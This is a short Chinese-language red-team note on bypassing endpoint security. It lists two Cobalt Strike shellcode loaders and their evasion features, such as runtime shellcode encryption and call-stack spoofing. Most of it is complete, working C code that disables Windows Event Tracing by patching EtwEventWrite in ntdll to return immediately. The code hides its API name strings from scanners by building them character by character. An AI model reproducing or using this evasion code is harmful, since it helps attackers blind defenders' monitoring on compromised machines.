一些常见终端绕过技术



## CS Loader
* AceLdr [ https://github.com/kyleavery/AceLdr ], 具备`shellcode`运行时加解密, 调用栈伪造等特性 (TitanLdr框架 + FOLIAGE + RET_ADDR_SPOOFING)
* TitanLdr [ https://github.com/kyleavery/TitanLdr ], 原版 D2H 的`shellcode`加载器, 粗略看过一遍


## Bypass ETW

```C

int DisableETW(void) {
	unsigned char strVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0x0 };
	unsigned char strFlushInstructionCache[] = { 'F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e',0x0 };
	WCHAR strKernel32dll[] = { 'K','e','r','n','e','l','3','2','.','d','l','l',0x0 };
	WCHAR strNtdlldll[] = { 'N','t','d','l','l','.','d','l','l',0x0 };

	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t)hlpGetProcAddress(hlpGetModuleHandle(strKernel32dll), (LPCSTR)strVirtualProtect);
	t_FlushInstructionCache pFlushInstructionCache = (t_FlushInstructionCache)hlpGetProcAddress(hlpGetModuleHandle(strKernel32dll), strFlushInstructionCache);

	DWORD oldprotect = 0;

	unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

	void* pEventWrite = hlpGetProcAddress(hlpGetModuleHandle((LPCSTR)strNtdlldll), (LPCSTR)sEtwEventWrite);

	VirtualProtect_p(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);

#ifdef _WIN64
	memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret
#else
	memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5);		// xor eax, eax; ret 14
#endif

	VirtualProtect_p(pEventWrite, 4096, oldprotect, &oldprotect);
	pFlushInstructionCache(-1, pEventWrite, 4096);
	return 0;
}

// https://github.com/Allevon412/BreadBear/blob/4f1f5da39b423f0655df9338e01c8b733c6d1152/stage1/Evasion.c
```
